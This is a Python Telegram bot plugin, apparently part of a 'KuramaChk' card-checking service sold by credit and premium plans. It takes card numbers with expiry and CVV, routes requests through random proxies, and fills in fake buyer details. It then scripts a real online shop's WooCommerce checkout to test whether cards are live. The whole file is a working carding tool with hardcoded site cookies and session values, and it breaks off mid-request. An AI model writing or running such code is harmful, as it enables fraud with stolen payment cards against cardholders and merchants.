import json
import base64
import requests
from Plugins.SegundoPlano.antispam import *
from parse import parseX
import check_template
import names
import datetime
import re
import AdyenEncrypt
import uuid
import parser_kurama
import time
import random
from func_bin import get_bin_info
from Plugins.Func import connect_to_db
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from requests.exceptions import ProxyError, ConnectionError

max_retries = 3
retry_delay = 3

proxiess = "proxys.txt"


keyboard = InlineKeyboardMarkup(
    [
        [InlineKeyboardButton("Premium for only $3", url="https://t.me/RefeDarwinScrapper/9175")]
    ]
)

def capture_fecha_hora_actual():
    # Capturar la fecha y hora actual
    now = datetime.datetime.now()

    # Formatear la fecha y hora según tu especificación (YYYY-MM-DD HH:MM:SS)
    formatted_date_time = now.strftime("%Y-%m-%d %H:%M:%S")
    
    return formatted_date_time


def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session

COMMAND_STATUS_FILE = "command_status.txt"

def is_command_enabled(command_name):
    with open(COMMAND_STATUS_FILE, "r") as f:
        command_status = f.read().splitlines()
    for line in command_status:
        name, status = line.split(":")
        if name == command_name:
            return status == "on"
    return False


name_gate = "Cardiny"
subtype = "$20"
command = "car"

@Client.on_message(filters.command([f"{command}"], prefixes=['.', '/', '!', '?'], case_sensitive=False) & filters.text)
def cardiny(client, message, command=command):
    if not is_command_enabled(f"{command}"):
            return message.reply(f""" <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a> 
━━━━━✧𝑲𝒖𝒓𝒂𝒎𝒂𝑪𝒉𝒌✧━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] STATUS ↯ <code>MANTENIMIENTO | OFF ❌</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] GATEWAY ↯  <code>{name_gate}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] SUBTYPE ↯  <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] USE ↯ <code>PREMIUM PLAN</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] VERSIÓN ↯ 6.0
━━━━━━━━━✧♛✧━━━━━━━━  </b> """, reply_markup=keyboard)
    username = message.from_user.username
    chat_id = message.chat.id
    user_id = message.from_user.id
    command = command
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    spam_message = antispam(user_id, command, message)
    if spam_message is not None:
        message.reply(spam_message)
        return        
            #--------- VERIFICACION DE BIN BANEADOS ----------#
    
    ccs = message.text[len(f"/{command} "):]  
    reply = message.reply_to_message
    
    
    
    try:
        if not ccs:
            reply = message.reply_to_message
            texto = reply.text[:6]
        else:
            texto = ccs[:6]
    
        
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
            
    except:
        pass
        
    
    try:
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
        
    except:
        pass
            
    conn = connect_to_db()
    cursor = conn.cursor()
    user_id = message.from_user.id
    username = message.from_user.username  
    
    cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (user_id,))
    user_data = cursor.fetchone()
    if not user_data:
                return message.reply(f"<b>First, you must register. /register .</b> ")
            
    if user_data[0] in ["Baneado", "baneado"]:
        return message.reply(f"<b>You are not allowed to use the \nReason: Banned bot❌. </b> ")
           
    chat_id2 = message.chat.id
    chat_data = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id2,))
    chat_data = cursor.fetchone()
    
    if chat_data is None:
        chat_data = "Free"
        
        
           
    if all(role not in user_data[0] for role in ["Premium", "Seller", "Owner"]) and all(role not in chat_data[0] for role in ["Staff", "Staff"]):
            return message.reply(f"<b>The chat is not authorized to use this command. Contact admin @Crypto_locker5 ❌</b> <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a>", reply_markup=keyboard)
        
    
    if user_data[1] is not None:
        current_credits = int(user_data[1])
    else:
        current_credits = 0
        
    if current_credits <= 1:
            message.reply(f"You do not have enough credits.  ")
            return 


    ccs = message.text[len(f"/{command} "):]  
                  
      
    reply = message.reply_to_message
            
    if not ccs:
        if not reply or not reply.text:
            return message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate}</code>   
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Subtype ↯ <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Use ↯ <code>${command} cc|month|year|cvv</code>
━━━━━━━━━━━━━━━━
</b>""", reply_markup=keyboard, disable_web_page_preview=True)
     

        ccs = reply.text
        

    result = parser_kurama.parseData(ccs)
    x = get_bin_info(ccs[:6])

    if 'error' in result:
        return message.reply(f"""<b> 
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>DECLINED ❌</b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Result ↯ Card Invalid!
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Checked by ↯ @{username} [{user_data[0]}]
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bot by ↯ @Crypto_locker5

</b>""", reply_markup=keyboard, disable_web_page_preview=True)
            
        
    ccnum = result['ccnum']
    mes = result['month']
    ano = result['year']
    if len(ano) == 2:
        ano = '20'+result['year']
    cvv = result['cvv']
    ccs = f"{ccnum}|{mes}|{ano}|{cvv}"
    
    fecha = capture_fecha_hora_actual()
    
    req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
    brand = req['brand']
    CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}%40gmail.com"
    x = get_bin_info(ccnum[:6])
        
    #---------- PLANTILLA DE CARGA #1 ------------#
    loading_message = message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>Loading...</b> 
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━  </b>""", reply_markup=keyboard, disable_web_page_preview=True)
    
    SessionId = generar_codigo_session()
    session = requests.Session()
    
    with open(proxiess, 'r') as file:
        proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
    
    inicio = time.time()

    #------------------- #1 Requests -------------------#
    headers = {
        'authority': 'amediasocial.com',
        # 'cookie': '_ga=GA1.1.1360660390.1707203736; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-02-06%2007%3A15%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Famediasocial.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-02-06%2007%3A15%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Famediasocial.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F121.0.0.0%20Safari%2F537.36%20Edg%2F121.0.0.0; cf_clearance=TVJGMuXWPM5_qrgS3_G4NDpUgxmGfQ1SDo.vodonE74-1707203738-1-AbbBHqBWFD6ZO8xtET6OYxBfZ2aA8zG7iK6qdPfJo5lYkDcZ4v1uRvP0s7jwlMnYBuQ4kNmROZIJDMRb3cWfPOo=; crisp-client%2Fsession%2F1f216d27-b08f-4b1d-9364-521d049745f7=session_253d4035-8833-4c56-bdf9-4d0128b9f7ad; _fbp=fb.1.1707203747657.1038168548; _gcl_au=1.1.897879165.1707203748; _uetsid=8c9e64f0c4bf11eea2fbed5d8bdc477d; _uetvid=8c9f0720c4bf11ee8199f5994716425d; __kla_id=eyJjaWQiOiJaamxoWXprMk16VXRNRFU1TnkwME1ESmtMVGt4WlRndE1qazNaRFJoTXpVNE1HRXoiLCIkcmVmZXJyZXIiOnsidHMiOjE3MDcyMDM3NDcsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vYW1lZGlhc29jaWFsLmNvbS8ifSwiJGxhc3RfcmVmZXJyZXIiOnsidHMiOjE3MDcyMDM4MjMsInZhbHVlIjoiIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vYW1lZGlhc29jaWFsLmNvbS8ifX0=; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Famediasocial.com%2Fcomprar-seguidores-instagram%2F; _ga_7D5RZKWKC6=GS1.1.1707203736.1.1.1707203875.4.0.0',
        'origin': 'https://amediasocial.com',
        'referer': 'https://amediasocial.com/comprar-seguidores-instagram/',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    files = {
        'attribute_cantidad': (None, '10.000'),
        'addon-206475-anadir-likes-opcional-1': (None, ''),
        'thwepof_product_fields': (None, ''),
        'url_field': (None, 'darwin_beat'),
        'quantity': (None, '1'),
        'gtm4wp_id': (None, '206475'),
        'gtm4wp_internal_id': (None, '206475'),
        'gtm4wp_name': (None, 'Comprar Seguidores Instagram'),
        'gtm4wp_sku': (None, 'comprar-seguidores-instagram-colombianos'),
        'gtm4wp_category': (None, 'Seguidores Instagram'),
        'gtm4wp_price': (None, '3.99'),
        'gtm4wp_stocklevel': (None, ''),
        'gtm4wp_brand': (None, 'Basicos Instagram'),
        'add-to-cart': (None, '206475'),
        'product_id': (None, '206475'),
        'variation_id': (None, '224840'),
        'alt_s': (None, ''),
        'chkwof3287': (None, '132846'),
    }

    
    for retry in range(max_retries):
        try:
            response = session.post('https://amediasocial.com/comprar-seguidores-instagram/', headers=headers, files=files)
    
            break  
        
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #1"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()  
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #1")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #1"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #1")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #1"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

    #------------------- #2 Requests -------------------#
    
    headers = {
        'Referer': 'https://amediasocial.com/comprar-seguidores-instagram/',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    
    for retry in range(max_retries):
        try:
            
            response = session.get('https://amediasocial.com/checkout/', headers=headers).text
    
            checkout_nonce = parseX(response, 'name="woocommerce-process-checkout-nonce" value="', '"')
            
            security = parseX(response, '"update_order_review_nonce":"', '"')
                
            break  
        
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #2"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #2")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #2"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #2")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #2"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
    #------------------- #3 Requests -------------------#   
    
    headers = {
        'authority': 'amediasocial.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_ga=GA1.1.1360660390.1707203736; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-02-06%2007%3A15%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Famediasocial.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-02-06%2007%3A15%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Famediasocial.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F121.0.0.0%20Safari%2F537.36%20Edg%2F121.0.0.0; cf_clearance=TVJGMuXWPM5_qrgS3_G4NDpUgxmGfQ1SDo.vodonE74-1707203738-1-AbbBHqBWFD6ZO8xtET6OYxBfZ2aA8zG7iK6qdPfJo5lYkDcZ4v1uRvP0s7jwlMnYBuQ4kNmROZIJDMRb3cWfPOo=; crisp-client%2Fsession%2F1f216d27-b08f-4b1d-9364-521d049745f7=session_253d4035-8833-4c56-bdf9-4d0128b9f7ad; _fbp=fb.1.1707203747657.1038168548; _gcl_au=1.1.897879165.1707203748; woocommerce_items_in_cart=1; woocommerce_cart_hash=fb58fd7cdf07c71956bdef789f034756; wp_woocommerce_session_238bff1af81989e50f47b3b6de3ab72b=t_c9918a1056c7478578f69f2590544a%7C%7C1707376676%7C%7C1707373076%7C%7Cfee6908349da2c481b29f29d5aeeebab; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Famediasocial.com%2Fcheckout%2F; _uetsid=8c9e64f0c4bf11eea2fbed5d8bdc477d; _uetvid=8c9f0720c4bf11ee8199f5994716425d; __kla_id=eyJsYXN0X25hbWUiOiJCZXJtdWRleiIsImVtYWlsIjoibmFuZXRlaGFybGVxdWluQGpjbm9ycmlzLmNvbSJ9; _ga_7D5RZKWKC6=GS1.1.1707203736.1.1.1707203922.17.0.0',
        'origin': 'https://amediasocial.com',
        'referer': 'https://amediasocial.com/checkout/',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'update_order_review',
    }

    data = f'security={security}&payment_method=cardinity&country=US&s_country=US&has_full_address=true&post_data=billing_email%3D{CorreoRand}%26billing_first_name%3DAndres%26billing_last_name%3DBermudez%26billing_country%3DUS%26kl_newsletter_checkbox%3D1%26wcccf_billing_qu_tipo_de_cliente_eres%3Dseleccionar%26account_username%3D%26order_comments%3D%26wc_order_attribution_type%3Dtypein%26wc_order_attribution_url%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Famediasocial.com%252F%26wc_order_attribution_session_start_time%3D{fecha}%26wc_order_attribution_session_pages%3D4%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F121.0.0.0%2520Safari%252F537.36%2520Edg%252F121.0.0.0%26thwcfe_price_data%3D%26thwcfe_disabled_fields%3D%26thwcfe_disabled_sections%3D%26thwcfe_repeat_fields%3D%26thwcfe_repeat_sections%3D%26thwcfe_unvalidated_fields%3D%26payment_method%3Dcardinity%26cardinity-card-holder%3D%26cardinity-card-number%3D%26cardinity-card-expiry%3D%26cardinity-card-cvc%3D%26cardinity_screen_width%3D1920%26cardinity_screen_height%3D1080%26cardinity_browser_language%3Den-US%26cardinity_color_depth%3D24%26cardinity_time_zone%3D-60%26card_token%3D375128c5ab33452b3f7cb11ffc6781f3aef26c36%26cr_customer_consent_field%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D95cb13bfb2%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'

    
    for retry in range(max_retries):
        try:
            response = session.post('https://amediasocial.com/', params=params, headers=headers, data=data).text
    
            card_token = parseX(response, 'card_token\\" value=\\"', '\\"')
                    
            print(card_token)
            
            break
           
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED ❌"
                respuesta = "Maximum number of retries reached: 3 | Requests #3"

                proxyy = "DEAD 🟥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #3")
            msg = "DECLINED ❌"
            respuesta = "Error de solicitud | Requests #3"

            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
        except KeyError as e:
            print(f"Error de clave: {e}")
            msg = "DECLINED ❌"
            respuesta = f"Error al obtener {e} del response | Requests #3"

            proxyy = "LIVE 🟩" 
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #3")
            msg = "DECLINED ❌"
            respuesta = "An unexpected error has occurred. | Requests #3"
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
    #------------------- #4 Requests -------------------#
    
    headers = {
        'authority': 'amediasocial.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '_ga=GA1.1.1360660390.1707203736; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-02-06%2007%3A15%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Famediasocial.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-02-06%2007%3A15%3A37%7C%7C%7Cep%3Dhttps%3A%2F%2Famediasocial.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F121.0.0.0%20Safari%2F537.36%20Edg%2F121.0.0.0; cf_clearance=TVJGMuXWPM5_qrgS3_G4NDpUgxmGfQ1SDo.vodonE74-1707203738-1-AbbBHqBWFD6ZO8xtET6OYxBfZ2aA8zG7iK6qdPfJo5lYkDcZ4v1uRvP0s7jwlMnYBuQ4kNmROZIJDMRb3cWfPOo=; crisp-client%2Fsession%2F1f216d27-b08f-4b1d-9364-521d049745f7=session_253d4035-8833-4c56-bdf9-4d0128b9f7ad; _fbp=fb.1.1707203747657.1038168548; woocommerce_items_in_cart=1; woocommerce_cart_hash=fb58fd7cdf07c71956bdef789f034756; wp_woocommerce_session_238bff1af81989e50f47b3b6de3ab72b=t_c9918a1056c7478578f69f2590544a%7C%7C1707376676%7C%7C1707373076%7C%7Cfee6908349da2c481b29f29d5aeeebab; __kla_id=eyJjaWQiOiJaRFEwWkdZME5UVXRZV1prTVMwMFpXUXhMV0V5WWpBdE56aGhZV0l3WmpKallXWmwiLCJlbWFpbCI6ImRhcndpbmRldm9maWNpYWxAZ21haWwuY29tIiwiZmlyc3RfbmFtZSI6IkFuZHJlcyIsImxhc3RfbmFtZSI6IkJlcm11ZGV6IiwiJHJlZmVycmVyIjp7InRzIjoxNzA3MjA0MTk4LCJ2YWx1ZSI6Imh0dHBzOi8vYW1lZGlhc29jaWFsLmNvbS9jb21wcmFyLXNlZ3VpZG9yZXMtaW5zdGFncmFtLyIsImZpcnN0X3BhZ2UiOiJodHRwczovL2FtZWRpYXNvY2lhbC5jb20vY2hlY2tvdXQvIn0sIiRsYXN0X3JlZmVycmVyIjp7InRzIjoxNzA3MjA0MTk4LCJ2YWx1ZSI6Imh0dHBzOi8vYW1lZGlhc29jaWFsLmNvbS9jb21wcmFyLXNlZ3VpZG9yZXMtaW5zdGFncmFtLyIsImZpcnN0X3BhZ2UiOiJodHRwczovL2FtZWRpYXNvY2lhbC5jb20vY2hlY2tvdXQvIn19; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Famediasocial.com%2Fcheckout%2F; _uetsid=8c9e64f0c4bf11eea2fbed5d8bdc477d; _uetvid=8c9f0720c4bf11ee8199f5994716425d; _ga_7D5RZKWKC6=GS1.1.1707203736.1.1.1707204219.37.0.0; _gcl_au=1.1.897879165.1707203748.1425512176.1707203923.1707204219',
        'origin': 'https://amediasocial.com',
        'referer': 'https://amediasocial.com/checkout/',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'checkout',
    }

    data = f'billing_email={CorreoRand}&billing_first_name=Andres&billing_last_name=Bermudez&billing_country=US&kl_newsletter_checkbox=1&wcccf_billing_qu_tipo_de_cliente_eres=seleccionar&account_username=&order_comments=&wc_order_attribution_type=typein&wc_order_attribution_url=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_session_entry=https%3A%2F%2Famediasocial.com%2F&wc_order_attribution_session_start_time={fecha}&wc_order_attribution_session_pages=5&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F121.0.0.0+Safari%2F537.36+Edg%2F121.0.0.0&thwcfe_price_data=&thwcfe_disabled_fields=&thwcfe_disabled_sections=&thwcfe_repeat_fields=&thwcfe_repeat_sections=&thwcfe_